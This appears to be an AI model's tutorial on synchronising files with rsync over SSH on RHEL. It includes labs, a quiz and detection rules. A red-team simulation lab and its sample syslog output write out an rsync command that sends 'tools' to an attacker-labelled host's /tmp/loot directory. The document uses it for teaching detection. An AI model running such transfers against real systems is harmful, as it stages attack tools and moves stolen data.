Excellent, Shahid.
Below is the **Master Grade Edition** Markdown documentation for:

# 🔄 **Lesson: Synchronize Files Between Systems Securely**

*Module 13 – Archive and Transfer Files*
*Cybersecurity Documentation Protocol Ultra v5.0 — Master Grade Edition*
------------------------------------------------------------------------

## 🔰 Introduction

File synchronization ensures **data consistency** across systems — vital for backup, disaster recovery, web content mirroring, and distributed deployments.

Unlike `scp` or `sftp`, which copy files blindly, **`rsync` intelligently syncs only what’s changed**, reducing bandwidth and time. Over SSH, this becomes a secure, efficient solution for both sysadmins and cyber operators.

> 🔒 *Objective*: Use `rsync` securely over SSH for reliable file synchronization on RHEL, automate sync jobs, simulate adversarial behavior, and detect unauthorized transfers.

---

## 🧠 Core Concepts (Feynman Style + Diagram)

### 🧠 What is `rsync`?

> "`rsync` is like sending a package but only replacing what’s new or changed inside, not the entire thing."

It:

* Syncs **incrementally**
* Preserves permissions, ownership, symlinks
* Works **over SSH**
* Supports resume and automation

### 🔐 Secure Sync Flow

```plaintext
[Local Filesystem]
      │
      ├── rsync (detects deltas)
      │
      └── SSH (encrypted transport)
             ↓
        [Remote Filesystem]
```

---

## 💻 Commands & Configs (Tested on RHEL 9)

### 🔹 Basic Sync (Local → Remote):

```bash
rsync -avz /var/www/ admin@192.168.1.110:/backup/web/
```

* `a`: archive (preserves structure and metadata)
* `v`: verbose
* `z`: compress during transfer
* `/var/www/`: trailing slash means contents (not the folder itself)

---

### 🔹 Remote → Local Sync:

```bash
rsync -avz admin@192.168.1.110:/backup/web/ ~/local_copy/
```

---

### 🔹 Dry Run (Preview Changes):

```bash
rsync -avzn ~/data/ remote:/backup/
```

* `n`: no changes made — just shows what would happen

---

### 🔹 Delete Removed Files from Destination:

```bash
rsync -avz --delete ~/data/ remote:/backup/
```

⚠️ Use with caution — this mirrors source state, including deletions.

---

### 🔹 Use SSH Explicitly:

```bash
rsync -e ssh -avz ~/data/ remote@host:/backup/
```

---

## 🧪 Labs

### 🟢 Beginner Lab: Sync Logs to Backup Server

```bash
mkdir ~/logdata && echo "test" > ~/logdata/test.log
rsync -avz ~/logdata/ user@192.168.1.100:/mnt/backup/logs/
```

✅ Check remote contents:

```bash
ssh user@192.168.1.100 'ls /mnt/backup/logs/'
```

---

### ⚙️ Tactical Lab: Website Mirror with Dry Run & Deletion

```bash
rsync -avzn --delete /var/www/ user@192.168.1.100:/mnt/backup/www/
# Now commit changes:
rsync -avz --delete /var/www/ user@192.168.1.100:/mnt/backup/www/
```

✅ Ideal for disaster recovery or web sync.

---

### 🎯 Simulation Lab: Red Team Tool Transfer via `rsync`

```bash
rsync -az tools/ attacker@192.168.56.110:/tmp/loot/
```

**MITRE ATT\&CK Tactic**: \[T1105 – Ingress Tool Transfer]
Blue teams should detect and flag this behavior.

---

## 🛡 Red/Blue Simulation

### 🔴 Red Team

| Technique             | MITRE ID | Action                                              |
| --------------------- | -------- | --------------------------------------------------- |
| Ingress Tool Transfer | T1105    | `rsync` used to move payloads to compromised server |

---

### 🔵 Blue Team: Detection Strategy

* **Auditd Rule**:

```bash
-w /usr/bin/rsync -p x -k monitor-rsync
```

* **Syslog Output**:

```plaintext
EXECVE: rsync -az tools/ attacker@192.168.56.110:/tmp/loot/
```

* **SIEM Rule Ideas**:

  * Outbound `rsync` to non-whitelisted IPs
  * Large data movement outside backup hours

---

## 🧠 Deep Quiz

1. What does `-a` flag in `rsync` do?
2. How would you simulate a sync without actually copying anything?
3. What happens if you add `--delete`?
4. Which MITRE technique involves using `rsync` for exfiltration?
5. What are the risks of improper use of `rsync` in automation?

---

## 🗂 Summary Table + Checklist

| Task                        | Command                                  | ✅ |
| --------------------------- | ---------------------------------------- | - |
| Basic sync (local → remote) | `rsync -avz src/ user@remote:/dest/`     | ⬜ |
| Remote → local              | `rsync -avz user@remote:/path/ ./local/` | ⬜ |
| Dry run                     | `rsync -avzn src/ dest/`                 | ⬜ |
| Delete mirror               | `rsync -avz --delete src/ dest/`         | ⬜ |
| SSH transfer                | `rsync -e ssh -avz ...`                  | ⬜ |

---

## 📓 Journaling + Confidence Tracker

* 🗓️ *Date Completed*: `_________`
* 💬 *What did you automate today with `rsync`?*
  `_________________________________________`
* ⚠️ *Any deletions caught with `--delete`?*
  `_________________________________________`
* 🔐 *Security considerations noted?*
  `_________________________________________`
* 🎯 *Confidence (1–5)*: `__`

---

## 🧭 Job Role & Cert Mapping

| Role         | Skill Used                         | Certifications     |
| ------------ | ---------------------------------- | ------------------ |
| Sysadmin     | Sync logs, configs, and web data   | RHCSA, LPIC-1      |
| SOC Analyst  | Monitor suspicious rsync traffic   | CEH, CySA+         |
| IR Analyst   | Detect/red flag unauthorized syncs | GCFA, CompTIA CSA+ |
| Red Team Ops | Deliver payloads via rsync/SSH     | OSCP, Red Team Ops |

---

## 🧠 Spaced Repetition Plan

* **Day 1**: Practice all rsync flags + SSH
* **Day 3**: Automate a local-to-remote sync job
* **Day 7**: Simulate Red Team rsync exfil and detect via Auditd
* **Day 30**: Teach a team member + document SOP for production use

---

✅ **Completed: Synchronize Files Between Systems Securely**

Let me know the **next lesson** in Module 13 you’d like me to document!
